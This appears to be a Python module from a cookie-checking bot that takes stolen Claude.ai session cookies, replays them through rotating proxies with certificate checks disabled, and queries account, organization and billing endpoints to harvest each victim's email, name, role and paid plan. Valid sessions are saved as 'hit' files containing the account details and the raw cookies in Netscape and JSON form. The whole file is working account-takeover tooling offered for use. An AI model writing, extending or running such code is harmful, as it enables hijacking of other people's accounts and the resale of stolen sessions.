"""
Claude Cookie Checker Engine
Based on claudee.py logic | Integrated into Hotmail Master Bot
"""
import re
import json
import time
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── Proxy helpers (shared with cookie_engine) ───────────────────────────────

_px_lock = __import__('threading').Lock()
_px_idx = 0
_dead_px: set = set()


def _proxy_str_to_requests(p: str) -> Optional[dict]:
    if not p:
        return None
    try:
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = p if p.startswith("http") else f"http://{p}"
        return {"http": url, "https": url}
    except:
        return None


def _next_proxy(proxies_list: List[str]) -> Optional[dict]:
    global _px_idx, _dead_px
    if not proxies_list:
        return None
    with _px_lock:
        attempts = 0
        while attempts < len(proxies_list) * 2:
            p = proxies_list[_px_idx % len(proxies_list)]
            _px_idx += 1
            attempts += 1
            if p not in _dead_px:
                return _proxy_str_to_requests(p)
        _dead_px.clear()
        p = proxies_list[_px_idx % len(proxies_list)]
        _px_idx += 1
        return _proxy_str_to_requests(p)


def _mark_dead(proxy_dict: Optional[dict]):
    if proxy_dict:
        with _px_lock:
            _dead_px.add(proxy_dict.get("http", ""))


# ─── Claude Cookie Parser ─────────────────────────────────────────────────────

_CLAUDE_SESSION_KEYS = [
    'sessionKey',
    '__Secure-next-auth.session-token',
    'lastActiveOrg',
    'routingHint',
    'anthropic-device-id',
    '__cf_bm',
    'cf_clearance',
    'intercom-session-',
]


def _parse_cookies_from_text(text: str) -> Dict[str, str]:
    """Parse cookies from text (Netscape/JSON/Header)"""
    text = text.strip()
    if not text:
        return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
            continue
        if '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                name = kv[0].strip().strip('"')
                value = kv[1].strip().strip(';').strip('"')
                if name and len(name) > 1 and not name.startswith('.'):
                    cookies[name] = value
    return cookies


def is_valid_claude(d: dict) -> bool:
    """Check if cookies contain Claude session keys"""
    return any(k in d for k in _CLAUDE_SESSION_KEYS)


def count_valid_claude(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_claude(d):
            result.append((src, d))
    return len(result), result


# ─── Claude Checker ───────────────────────────────────────────────────────────

CLAUDE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'referer': 'https://claude.ai/',
    'origin': 'https://claude.ai',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
}


def _detect_claude_plan(capabilities: list) -> tuple:
    """Detect Claude plan from capabilities (Team > Max > Pro > Free)"""
    caps = [c.lower() for c in (capabilities or [])]
    if any(c in caps for c in ('raven', 'claude_team', 'team', 'enterprise')):
        return 'Team', True
    if any(c in caps for c in ('claude_max', 'max')):
        return 'Max', True
    if any(c in caps for c in ('claude_pro', 'pro')):
        return 'Pro', True
    return 'Free', False


def _detect_plan_from_billing(html: str) -> tuple:
    """Parse billing/settings page for plan markers — fallback when capabilities empty"""
    low = (html or '').lower()
    # Strong paid markers first
    if 'claude team' in low or 'team plan' in low:
        return 'Team', True
    if 'claude max' in low or 'max plan' in low:
        return 'Max', True
    if ('claude pro' in low or 'pro plan' in low) and 'upgrade' not in low.split('claude pro')[0][-80:]:
        return 'Pro', True
    if 'manage plan' in low and 'current plan' in low and 'free' not in low:
        return 'Pro', True
    if 'upgrade to pro' in low or 'upgrade your plan' in low or 'free plan' in low:
        return 'Free', False
    return None, None


def _make_claude_session(cookies: dict, proxy: Optional[dict]) -> requests.Session:
    """Create requests session with Claude cookies"""
    s = requests.Session()
    jar = requests.cookies.RequestsCookieJar()
    for k, v in cookies.items():
        jar.set(k, v, domain=".claude.ai", path="/")
        jar.set(k, v, domain="claude.ai", path="/")
    s.cookies = jar
    if proxy:
        s.proxies.update(proxy)
        s.verify = False
    return s


def check_claude_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    """Check Claude.ai cookie and return account info"""
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        session = _make_claude_session(cookies_dict, px)

        info = {
            'logged_in': False, 'email': None, 'name': None,
            'plan_label': 'Free', 'is_pro': False, 'org': None,
            'org_role': None, 'capabilities': [], 'country': 'N/A'
        }

        # Step 1: Check homepage redirect
        try:
            r = session.get("https://claude.ai/", headers={**CLAUDE_HEADERS, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "sec-fetch-dest": "document"}, timeout=15, allow_redirects=True)
            if 'login' in r.url or r.status_code in (401, 403):
                return None, 'expired'
            if r.status_code != 200:
                return None, 'error'
        except:
            return None, 'error'

        # Step 2: /api/account
        try:
            r = session.get("https://claude.ai/api/account", headers=CLAUDE_HEADERS, timeout=15, allow_redirects=False)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict):
                    info['logged_in'] = True
                    info['email'] = data.get('email_address')
                    info['name'] = data.get('full_name') or data.get('display_name')

                    memberships = data.get('memberships', [])
                    if memberships:
                        last_org_id = cookies_dict.get('lastActiveOrg', '')
                        active = None
                        for m in memberships:
                            org = m.get('organization', {})
                            if org.get('uuid', '') == last_org_id or org.get('id', '') == last_org_id:
                                active = m
                                break
                        if not active:
                            active = memberships[0]

                        org = active.get('organization', {})
                        info['org'] = org.get('name')
                        info['org_role'] = active.get('role')
                        caps = org.get('capabilities', [])
                        info['capabilities'] = caps
                        info['plan_label'], info['is_pro'] = _detect_claude_plan(caps)
                    elif data.get('invites'):
                        inv_caps = []
                        for inv in data.get('invites', []):
                            inv_caps += inv.get('organization', {}).get('capabilities', [])
                        info['plan_label'], info['is_pro'] = _detect_claude_plan(inv_caps)
        except:
            pass

        # Step 3: Fallback /api/account_profile
        if not info['email']:
            try:
                r = session.get("https://claude.ai/api/account_profile", headers=CLAUDE_HEADERS, timeout=12, allow_redirects=False)
                if r.status_code == 200:
                    p = r.json()
                    if isinstance(p, dict):
                        info['logged_in'] = True
                        info['email'] = info['email'] or p.get('email_address') or p.get('email')
                        info['name'] = info['name'] or p.get('full_name') or p.get('display_name')
            except:
                pass

        # Step 4: /api/organizations
        if not info.get('org'):
            try:
                r = session.get("https://claude.ai/api/organizations", headers=CLAUDE_HEADERS, timeout=12)
                if r.status_code == 200:
                    orgs = r.json()
                    if isinstance(orgs, list) and orgs:
                        info['logged_in'] = True
                        org = orgs[0]
                        info['org'] = org.get('name')
                        info['org_role'] = org.get('role') or org.get('my_role')
                        caps = org.get('capabilities', [])
                        if caps:
                            info['plan_label'], info['is_pro'] = _detect_claude_plan(caps)
            except:
                pass

        # Step 5: Billing page fallback — jab capabilities empty/ambiguous ho
        if info['plan_label'] == 'Free' and not info['capabilities']:
            try:
                rb = session.get("https://claude.ai/settings/billing", headers=CLAUDE_HEADERS,
                                 timeout=12, allow_redirects=True)
                if rb.status_code == 200:
                    bl, bp = _detect_plan_from_billing(rb.text)
                    if bl:
                        info['plan_label'], info['is_pro'] = bl, bp
            except Exception:
                pass

        if not info.get('logged_in'):
            return None, 'expired'

        return info, 'valid'

    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_claude(d: dict) -> str:
    """Generate Netscape format cookies for Claude"""
    lines = ["# Netscape HTTP Cookie File", "# Claude Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    for name, value in d.items():
        secure = "TRUE" if name.startswith("__Secure") or name.startswith("__Host") else "FALSE"
        lines.append(f".claude.ai\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_claude(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    """Format Claude hit output"""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_claude(cookies_dict)

    caps = ', '.join(result.get('capabilities', [])) or 'N/A'

    content = f"""════════════════════════════════════════════════════════
  WHITE Claude Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Name          : {result.get('name', 'N/A')}
  Email         : {result.get('email', 'N/A')}
  Plan          : {result.get('plan_label', 'N/A')}
  Premium       : {'Yes' if result.get('is_pro') else 'No'}
  Organization  : {result.get('org', 'N/A')}
  Role          : {result.get('org_role', 'N/A')}
  Capabilities  : {caps}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Claude Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_plan = re.sub(r'[<>:"/\|?*\s]', '_', result.get("plan_label", "unknown").lower())
    safe_email = re.sub(r'[<>:"/\|?*\s]', '_', result.get("email", "unknown"))
    filename = f"[claude_{safe_plan}][{safe_email}].txt"
    return content, filename
